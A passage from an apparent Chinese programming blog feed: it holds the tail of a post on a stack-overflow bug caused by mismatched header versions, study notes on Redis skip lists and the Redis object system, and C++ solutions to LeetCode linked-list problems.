<p>根据64位<strong>结构体对齐规则</strong>，左边结构体大小为120，右边结构体大小为128，多出的这8个字节恰好覆盖了<code>canary</code>，导致栈溢出。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>公司的C代码中，多个.so会依赖相同的开源头文件，如果不能保证每个.so各自依赖的头文件版本一致，就可能出现上述的栈溢出问题。</p>
</li>
<li><p>通过设置GCC的编译选项fstack-protector开启栈保护机制，便于栈溢出问题的定位。</p>
</li>
</ul>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》 3.10.4.2 栈破坏检测</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(四)——跳跃表</title>
    <url>/2021/01/23/2021-01-23-redis-note-04-skiplist/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跳跃表是<strong>一种以O(log N)期望时间支持查找、插入、删除操作的、有序的</strong>数据结构。</p>
<p>Redis使用跳跃表作为<strong>有序集合键</strong>的底层实现之一。</p>
<p>跳表的基本实现原理参考：<a href="http://www.cl.cam.ac.uk/teaching/0506/Algorithms/skiplists.pdf">《Skip lists: a probabilistic alternative to balanced trees》</a></p>
<h3 id="Redis中的跳表实现"><a href="#Redis中的跳表实现" class="headerlink" title="Redis中的跳表实现"></a>Redis中的跳表实现</h3><span id="more"></span>

<p>Redis的跳表由zskiplistNode, zskiplist两个数据结构定义。</p>
<p>跳跃表节点的实现如下，由<code>redis.h/zskiplistNode</code>定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ZSETs use a specialized version of Skiplists */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> &#123;</span></span><br><span class="line">    sds ele;							<span class="comment">// 成员对象，唯一</span></span><br><span class="line">    <span class="type">double</span> score;						<span class="comment">// 跳表按分值排序，不唯一</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">backward</span>;</span>		<span class="comment">// 后退指针，用于表尾到表头访问</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistLevel</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">forward</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> span;				<span class="comment">// 跨度</span></span><br><span class="line">    &#125; level[];							<span class="comment">// 层</span></span><br><span class="line">&#125; zskiplistNode;</span><br></pre></td></tr></table></figure>

<p>Redis中跳表和普通跳表区别如下：</p>
<ul>
<li>添加span属性，表示跨度，用于计算排位。</li>
<li>添加backward后退指针，用于表尾到表头访问节点，每次只能后退一个节点。</li>
<li>ele表示SDS对象，必须是唯一的，而普通跳表存储的值可以不唯一。</li>
<li>添加score属性，表示分值，这是Redis跳表排序的依据，score的值允许重复。如score值相同，按ele字典序排列</li>
</ul>
<p>Redis通过zskiplist结构来持有跳表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplist</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">header</span>, *<span class="title">tail</span>;</span>	<span class="comment">// 定位表头、表尾复杂度为O(1)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> length;					<span class="comment">// O(1)获取跳表长度</span></span><br><span class="line">    <span class="type">int</span> level;								<span class="comment">// 层高，注意表头节点的层高不计算在内</span></span><br><span class="line">&#125; zskiplist;</span><br></pre></td></tr></table></figure>

<h3 id="跳表API"><a href="#跳表API" class="headerlink" title="跳表API"></a>跳表API</h3><table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">zskiplist *zslCreate(void);</td>
<td align="left">创建跳表</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">void zslFree(zskiplist *zsl);</td>
<td align="left">释放跳表</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">zskiplistNode *zslInsert(zskiplist *zsl, double score, sds ele);</td>
<td align="left">插入</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">int zslDelete(zskiplist *zsl, double score, sds ele, zskiplistNode **node);</td>
<td align="left">删除跳表</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">unsigned long zslGetRank(zskiplist *zsl, double score, sds ele);</td>
<td align="left">返回给定节点的排位</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">zskiplistNode* zslGetElementByRank(zskiplist *zsl, unsigned long rank);</td>
<td align="left">返回指定排位的节点</td>
<td align="left">O(logN)</td>
</tr>
</tbody></table>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Redis设计与实现》第5章 跳跃表</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(六)——对象系统</title>
    <url>/2021/01/23/2021-01-23-redis-note-06-object/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis没有直接使用基础数据结构来实现数据库，而是基于这些数据结构创建了一个对象系统。这个系统包含字符串对象、列表对象、哈希对象、集合对象、有序集合对象。</p>
<h3 id="1-Redis3-0中的6种基础数据结构"><a href="#1-Redis3-0中的6种基础数据结构" class="headerlink" title="1. Redis3.0中的6种基础数据结构"></a>1. Redis3.0中的6种基础数据结构</h3><span id="more"></span>

<table>
<thead>
<tr>
<th align="left">数据结构</th>
<th align="left">应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">简单动态字符串</td>
<td align="left">保存字符串值</td>
</tr>
<tr>
<td align="left">链表</td>
<td align="left">列表键，发布与订阅，慢查询，监视器</td>
</tr>
<tr>
<td align="left">字典</td>
<td align="left">哈希键，数据库键空间</td>
</tr>
<tr>
<td align="left">跳跃表</td>
<td align="left">有序集合键</td>
</tr>
<tr>
<td align="left">整数集合</td>
<td align="left">集合键</td>
</tr>
<tr>
<td align="left">压缩列表</td>
<td align="left">列表键、哈希键</td>
</tr>
</tbody></table>
<h3 id="2-对象的类型和编码"><a href="#2-对象的类型和编码" class="headerlink" title="2. 对象的类型和编码"></a>2. 对象的类型和编码</h3><p>Redis使用对象表示数据库中的键和值，每次在Redis新建一个键值对都会创建两个对象，<strong>键对象和值对象</strong>。</p>
<p>Redis中的每个对象由一个<code>struct redisObject</code>结构表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/redis.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisObject</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> type:<span class="number">4</span>;			    <span class="comment">// 类型</span></span><br><span class="line">    <span class="type">unsigned</span> encoding:<span class="number">4</span>;			<span class="comment">// 编码</span></span><br><span class="line">    <span class="type">unsigned</span> lru:<span class="number">24</span>;				<span class="comment">// 记录对象最后一次被命令程序访问的时间</span></span><br><span class="line">    <span class="type">int</span> refcount;					<span class="comment">// 引用计数</span></span><br><span class="line">    <span class="type">void</span> *ptr;						<span class="comment">// 指向底层实现数据结构的指针</span></span><br><span class="line">&#125; robj;</span><br></pre></td></tr></table></figure>

<p>其中type属性表示对象类型， encoding属性表示对象编码。以下介绍对象类型和对象编码的概念。</p>
<h4 id="2-1-对象类型"><a href="#2-1-对象类型" class="headerlink" title="2.1 对象类型"></a>2.1 对象类型</h4><p>Redis 3.0中，定义如下5种对象类型：</p>
<table>
<thead>
<tr>
<th align="left">类型常量</th>
<th align="left">对象名称</th>
<th align="left">TYPE命令的输出</th>
</tr>
</thead>
<tbody><tr>
<td align="left">REDIS_STRING</td>
<td align="left">字符串</td>
<td align="left">“string”</td>
</tr>
<tr>
<td align="left">REDIS_LIST</td>
<td align="left">列表</td>
<td align="left">“list”</td>
</tr>
<tr>
<td align="left">REDIS_SET</td>
<td align="left">集合</td>
<td align="left">“set”</td>
</tr>
<tr>
<td align="left">REDIS_ZSET</td>
<td align="left">有序集合</td>
<td align="left">“zset”</td>
</tr>
<tr>
<td align="left">REDIS_HASH</td>
<td align="left">哈希</td>
<td align="left">“hash”</td>
</tr>
</tbody></table>
<p>注意，对于Redis中的任一键值对，键总是一个字符串对象，而值可以是上面5种对象的任意一种。比如说，列表键的意思是指，这个键对应的值是列表对象，其他类型对象以此类推。</p>
<p><code>TYPE</code>命令用于返回对象类型。</p>
<h4 id="2-2-对象编码"><a href="#2-2-对象编码" class="headerlink" title="2.2 对象编码"></a>2.2 对象编码</h4><p>redisObject中的ptr指针指向对象使用的基础数据结构，而具体使用何种数据结构是由对象编码决定的。</p>
<p>encoding属性用于表示对象编码，说明这个对象使用的是何种数据结构。Redis 3.0中，encoding值可以是如下的任何一种：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">使用的底层数据结构</th>
</tr>
</thead>
<tbody><tr>
<td align="left">REDIS_ENCODING_RAW</td>
<td align="left">SDS</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_INT</td>
<td align="left">long类型数</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_HT</td>
<td align="left">字典</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_LINKEDLIST</td>
<td align="left">双端链表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_ZIPLIST</td>
<td align="left">压缩列表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_INTSET</td>
<td align="left">整数集合</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_SKIPLIST</td>
<td align="left">跳表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_EMBSTR</td>
<td align="left">EMBSTR编码的SDS</td>
</tr>
</tbody></table>
<p><code>OBJECT ENCODING</code>命令用于查看某个数据库键的值对象的编码。</p>
<p>每种类型的对象都使用了至少两种不同的编码，这使得Redis可以优化对象在不同场景下的效率和空间占用。</p>
<h4 id="2-3-不同类型和编码的对象"><a href="#2-3-不同类型和编码的对象" class="headerlink" title="2.3 不同类型和编码的对象"></a>2.3 不同类型和编码的对象</h4><table>
<thead>
<tr>
<th align="left">对象类型</th>
<th align="left">可能的编码类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">字符串</td>
<td align="left">long, embstr,raw</td>
</tr>
<tr>
<td align="left">列表</td>
<td align="left">压缩列表、双端链表</td>
</tr>
<tr>
<td align="left">哈希</td>
<td align="left">压缩列表、字典</td>
</tr>
<tr>
<td align="left">集合</td>
<td align="left">整数集合、字典</td>
</tr>
<tr>
<td align="left">有序集合</td>
<td align="left">压缩列表、跳表</td>
</tr>
</tbody></table>
<h3 id="2-Redis中的五种对象类型"><a href="#2-Redis中的五种对象类型" class="headerlink" title="2. Redis中的五种对象类型"></a>2. Redis中的五种对象类型</h3><h4 id="2-1-字符串对象"><a href="#2-1-字符串对象" class="headerlink" title="2.1 字符串对象"></a>2.1 字符串对象</h4><p>字符串对象有三种编码，可以是int, embstr, raw。使用何种编码是通过字符串对象保存的值类型和字符串长度决定，规则如下：</p>
<ul>
<li>如果保存的是整数值，且整数不超过long范围，使用int编码</li>
<li>如果保存的是字符串值，且字符串长度 &gt; 39， 使用raw编码</li>
<li>如果保存的是字符串值，且字符串长度 &lt;&#x3D; 39，使用embstr编码</li>
</ul>
<p>对应redis源码中<code>CreateStringObject</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_ENCODING_EMBSTR_SIZE_LIMIT 39</span></span><br><span class="line">robj *<span class="title function_">createStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= REDIS_ENCODING_EMBSTR_SIZE_LIMIT)</span><br><span class="line">        <span class="keyword">return</span> createEmbeddedStringObject(ptr,len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> createRawStringObject(ptr,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-1-1-为什么需要embstr编码？"><a href="#2-1-1-为什么需要embstr编码？" class="headerlink" title="2.1.1 为什么需要embstr编码？"></a>2.1.1 为什么需要embstr编码？</h5><p>embstr编码是专门为保存短字符串的一种优化编码方式。和raw编码区别在于，embstr编码仅调用一次内存分配函数同时创建redisObject和sdshdr结构，优势如下：</p>
<ul>
<li>内存分配、内存回收次数由两次降为一次。</li>
<li>redisObject结构和sdshdr结构的内存是连续的、因此能更好地利用缓存。</li>
</ul>
<p>以下分别给出raw编码和embstr编码的字符串对象示意图：</p>
<p>raw编码字符串：</p>
<p><img src="/2021/01/23/2021-01-23-redis-note-06-object/image1.png"></p>
<p>embstr编码字符串：<br><img src="/2021/01/23/2021-01-23-redis-note-06-object/image2.png"></p>
<h5 id="2-1-2-编码的转换"><a href="#2-1-2-编码的转换" class="headerlink" title="2.1.2 编码的转换"></a>2.1.2 编码的转换</h5><p>如果对int , embstr编码的字符串执行append操作，它们总是会转换为raw编码的字符串, 理由如下：</p>
<ul>
<li><p>对int编码字符串做了append操作后，这个对象保存的就不再是整数值，所以编码必须发生转换。</p>
</li>
<li><p>对于embstr编码，Redis没有为embstr编码的字符串对象编写任何修改其内容的代码，所以append操作后embstr编码总转换成raw。也就是说，embstr编码的字符串为只读对象。</p>
</li>
</ul>
<h4 id="2-2-列表对象"><a href="#2-2-列表对象" class="headerlink" title="2.2 列表对象"></a>2.2 列表对象</h4><p>列表对象编码可以是ziplist或linkedlist，创建列表对象代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createListObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line">robj *<span class="title function_">createZiplistObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-2-1-编码的转换"><a href="#2-2-1-编码的转换" class="headerlink" title="2.2.1 编码的转换"></a>2.2.1 编码的转换</h5><p>当列表对象同时满足以下两个条件时，列表对象使用ziplist编码，否则使用linkedlist编码</p>
<ul>
<li>列表对象保存的所有字符串元素的长度都小于64字节</li>
<li>列表对象保存的元素个数小于512个</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>list-max-ziplist-value, list-max-ziplist-entries</code></p>
<h4 id="2-3-哈希对象"><a href="#2-3-哈希对象" class="headerlink" title="2.3 哈希对象"></a>2.3 哈希对象</h4><p>哈希对象编码可以是ziplist或hashtable，创建对象代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createHashObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-3-1-编码的转换"><a href="#2-3-1-编码的转换" class="headerlink" title="2.3.1 编码的转换"></a>2.3.1 编码的转换</h5><p>当哈希对象同时满足以下两个条件时，哈希对象使用ziplist编码，否则使用hashtable编码</p>
<ul>
<li>哈希对象保存的所有键值对的键和值长度都小于64字节</li>
<li>哈希对象保存的键值对数少于512个</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>hash-max-ziplist-value, hash-max-ziplist-entries</code></p>
<h4 id="2-4-集合对象"><a href="#2-4-集合对象" class="headerlink" title="2.4 集合对象"></a>2.4 集合对象</h4><p>集合对象编码可以是intset或hashtable</p>
<h5 id="2-4-1-编码的转换"><a href="#2-4-1-编码的转换" class="headerlink" title="2.4.1 编码的转换"></a>2.4.1 编码的转换</h5><p>当集合对象可以同时满足以下两个条件时，对象使用intset编码，否则使用hashtable编码</p>
<ul>
<li>集合对象保存的都是整数值。</li>
<li>集合对象保存的元素数量不超过512个。</li>
</ul>
<p>以上条件可以通过配置文件修改, 相关配置项：<code>set-max-intset-entries</code></p>
<h4 id="2-5-有序集合对象"><a href="#2-5-有序集合对象" class="headerlink" title="2.5 有序集合对象"></a>2.5 有序集合对象</h4><p>有序集合对象编码可以是ziplist或skiplist</p>
<p>基于skiplist编码的数据结构如下，可以看到有序集合对象同时使用了跳表和字典数据结构来实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zset</span> &#123;</span></span><br><span class="line">	zskiplist *zsl;</span><br><span class="line">	dict *dict;</span><br><span class="line">&#125; zset;</span><br></pre></td></tr></table></figure>

<p>有序集合元素同时保存在跳表和字典，示意图如下：<br><img src="/2021/01/23/2021-01-23-redis-note-06-object/image3.png"></p>
<p>图中字典和跳表重复列出了各元素的成员和分数，而源码实现中，字典和跳表会共享元素的成员和分数，不会导致内存浪费。</p>
<h5 id="2-5-1-为什么有序集合需要同时使用跳跃表和字典来实现？"><a href="#2-5-1-为什么有序集合需要同时使用跳跃表和字典来实现？" class="headerlink" title="2.5.1 为什么有序集合需要同时使用跳跃表和字典来实现？"></a>2.5.1 为什么有序集合需要同时使用跳跃表和字典来实现？</h5><ul>
<li><p>如只使用字典，因为字典是无序的，执行范围操作时须先排序，复杂度O(NlogN)，以及额外O(N)空间。</p>
</li>
<li><p>如只使用跳表，那么根据成员查找分数的操作效率较低，其复杂度为O(logN)。</p>
</li>
</ul>
<h5 id="2-5-2-编码的转换"><a href="#2-5-2-编码的转换" class="headerlink" title="2.5.2 编码的转换"></a>2.5.2 编码的转换</h5><p>有序集合对象可以同时满足以下两个条件，对象使用ziplist编码，否则使用skiplist编码</p>
<ul>
<li>有序集合保存元素数量小于128个。</li>
<li>有序集合保存的所有元素成员都小于64个字节。</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>zset-max-ziplist-entries，zset-max-ziplist-value</code></p>
<h3 id="3-内存回收机制"><a href="#3-内存回收机制" class="headerlink" title="3. 内存回收机制"></a>3. 内存回收机制</h3><p>Redis是通过C语言实现的，C语言没有内存自动回收机制，因此Redis在对象系统中通过引用计数方式实现内存回收机制。</p>
<p>每个对象的引用计数信息通过redisObject结构中的refcount属性表示：</p>
<ul>
<li>创建新对象时，引用计数初始为1</li>
<li>对象被新程序使用时，引用计数加1，参考 <code>object.c/incrRefCount</code></li>
<li>对象不再被程序使用时，引用计数减1，当引用计数减为0时回收内存，参考<code>object.c/decrRefCount</code></li>
</ul>
<p><code>OBJECT REFCOUNT</code>命令可以查看对象的引用计数。</p>
<h3 id="4-对象共享机制"><a href="#4-对象共享机制" class="headerlink" title="4. 对象共享机制"></a>4. 对象共享机制</h3><p>对象的refcount属性除了用于实现内存回收机制外，还具有共享内存的作用。</p>
<p>比如，Redis服务器启动时会预先创建0 ~ 9999这1万个字符串对象。当redis需用到0 ~ 9999的字符串对象时，直接使用共享对象，不必每次都创建新对象，从而节约内存。源码参考<code>object.c/createStringObjectFromLongLong</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// object.c</span></span><br><span class="line">robj *<span class="title function_">createStringObjectFromLongLong</span><span class="params">(<span class="type">long</span> <span class="type">long</span> value)</span> &#123;</span><br><span class="line">    robj *o;</span><br><span class="line">    <span class="comment">// 如果value的大小符合 REDIS 共享整数的范围，直接使用共享对象，不用创建新对象</span></span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt; REDIS_SHARED_INTEGERS) &#123;</span><br><span class="line">        incrRefCount(shared.integers[value]);</span><br><span class="line">        o = shared.integers[value];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="comment">// 不在0 ~ 9999范围内，创建新的整数对象，以下代码省略</span></span><br><span class="line">        <span class="comment">// .......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="4-1-为什么Redis只共享包含整数的对象？"><a href="#4-1-为什么Redis只共享包含整数的对象？" class="headerlink" title="4.1 为什么Redis只共享包含整数的对象？"></a>4.1 为什么Redis只共享包含整数的对象？</h4><ul>
<li>redis只共享包含数字的对象，是因为数字的复用场景最多。</li>
<li>出于CPU限制。在使用一个共享对象前，需要判断共享对象和目前对象是否相等。一个共享对象的值越复杂，这个判断的时间复杂度越高，越消耗CPU性能，注意到：<ul>
<li>数字比较复杂度仅为O(1)</li>
<li>字符串比较复杂度为O(n)</li>
<li>对于更复杂的列表和哈希对象，比较复杂度上升到O(n ^ 2)。</li>
</ul>
</li>
</ul>
<h3 id="5-对象的空转时长"><a href="#5-对象的空转时长" class="headerlink" title="5. 对象的空转时长"></a>5. 对象的空转时长</h3><p><code>RedisObject</code>的lru属性记录对象最后一次被命令程序访问的时间，可用于计算某个数据库键的空转时长。</p>
<p><code>OBJECT LDLETIME</code>命令用于获取对象的空转时长，空转时长是通过当前时间减去对象的lru值计算得出。</p>
<p>空转时长可用于Redis服务器回收内存算法，原则是内存不足时，空转时长高的键优先被服务器释放，回收内存。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>Redis的对象系统包含五种基本对象：字符串对象、列表对象、哈希对象、集合对象、有序集合对象。</li>
<li>每种类型的对象都使用了至少两种不同的编码，这使得Redis可以针对不同的场景，为对象设置多种不同的数据结构，优化对象在不同场景下的效率。</li>
<li>Redis对象实现了基于引用计数的内存回收机制，对象共享机制，从而节约内存。</li>
<li>Redis的对象带有访问事件记录信息，用于计算数据库键的空转时长，空转时长可以用于服务器的内存回收算法。</li>
</ul>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Redis设计与实现》 —— 第8章 对象</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode几道链表题解决思路</title>
    <url>/2021/02/06/2021-02-06-leetcode-linkedlist-problems/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>LeetCode链表题汇总，记录解题思路，C&#x2F;C++语言实现。</p>
<h3 id="LeetCode链表题"><a href="#LeetCode链表题" class="headerlink" title="LeetCode链表题"></a>LeetCode链表题</h3><ul>
<li><p>判断链表是否有环 ：<a href="https://leetcode-cn.com/problems/linked-list-cycle/">https://leetcode-cn.com/problems/linked-list-cycle/</a></p>
</li>
<li><p>输出环形链表的入环点：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">https://leetcode-cn.com/problems/linked-list-cycle-ii/</a></p>
</li>
<li><p>输出链表中倒数第k个节点：<a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/</a></p>
</li>
<li><p>反转链表：<a href="https://leetcode-cn.com/problems/reverse-linked-list/">https://leetcode-cn.com/problems/reverse-linked-list/</a></p>
</li>
</ul>
<span id="more"></span>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="判断链表是否有环"><a href="#判断链表是否有环" class="headerlink" title="判断链表是否有环"></a>判断链表是否有环</h4><p>思路：快慢指针法。 慢指针每前进一步，快指针就前进两步。如果快慢指针能相遇，证明有环，反之无环。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = head;</span><br><span class="line">    ListNode *slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fast = fast-&gt;next-&gt;next;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (fast == slow) &#123; <span class="comment">// 如果快慢指针能相遇，说明有环。</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="输出环形链表的入环点"><a href="#输出环形链表的入环点" class="headerlink" title="输出环形链表的入环点"></a>输出环形链表的入环点</h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历一次链表，将遍历到的节点存储到哈希表，如果节点已经在哈希表中，说明有环，输出入环点。</p>
<p><strong>复杂度分析：</strong> 时间复杂度O(N),  空间复杂度O(N)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    std::unordered_map&lt;ListNode *, <span class="type">int</span>&gt; t; <span class="comment">// 用哈希表将遍历过节点保存下来</span></span><br><span class="line">    <span class="keyword">while</span>(head) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t.<span class="built_in">find</span>(head) != t.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        t[head] = <span class="number">1</span>;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 快慢指针法。创建fast, slow两个指针指向链表头，令fast前进速度为slow的两倍。当快慢指针相遇时，再创建一个指针p指向链表头, 让p和slow等速前进，p和slow必定会相遇，且相遇点即为入环点。</p>
<p>数学证明参考：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/huan-xing-lian-biao-ii-by-leetcode-solution/">LeetCode官方题解</a></p>
<p><strong>复杂度分析：</strong> 时间复杂度O(N), 空间复杂度O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    ListNode *fast, *slow;</span><br><span class="line">    fast = slow = head;</span><br><span class="line">    <span class="keyword">while</span>(fast) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fast-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fast前进速度为slow两倍</span></span><br><span class="line">        fast = fast-&gt;next-&gt;next;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="comment">// 快慢指针相遇时，用一个指针p指向链表头，让p和slow同时前进，p和slow相遇点即为入环点，</span></span><br><span class="line">        <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">            ListNode *p = head;</span><br><span class="line">            <span class="keyword">while</span> (p != slow) &#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                slow = slow-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="输出链表中倒数第k个节点"><a href="#输出链表中倒数第k个节点" class="headerlink" title="输出链表中倒数第k个节点"></a>输出链表中倒数第k个节点</h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历两次单链表，第一次遍历求出链表长度记为len, 第二次遍历找到第len - k个节点并输出即可。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度 O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	ListNode *cur = head;</span><br><span class="line">	<span class="keyword">while</span>(cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		++len;</span><br><span class="line">		cur = cur-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - k; ++i) &#123;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 双指针法，设指针p, q，初始时将p指向链表头节点，q指向第k+1个节点，然后让p, q指针等速前进，当q为NULL时， p即为所求。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度 O(1)</p>
